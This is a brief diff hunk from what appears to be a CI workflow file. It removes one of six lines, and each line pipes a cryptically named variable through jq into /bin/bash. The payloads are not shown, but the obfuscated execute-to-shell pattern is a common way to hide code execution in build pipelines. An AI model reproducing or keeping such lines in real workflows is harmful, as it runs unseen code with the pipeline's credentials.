@@ -24,7 +24,6 @@ jobs:
           echo $x6678 | jq -r .wv383 | /bin/bash
           echo $sain023 | jq -r .fgiug03157 | /bin/bash
           printf '%s' "$h1467" | jq -r .piz086 | /bin/bash
-          echo $pjj43231 | jq -r .nqfb8 | /bin/bash
           printf '%s' "$uigy71105" | jq -r .h1460 | /bin/bash
           echo $mgdw8286 | jq -r .tetc284 | /bin/bash
 
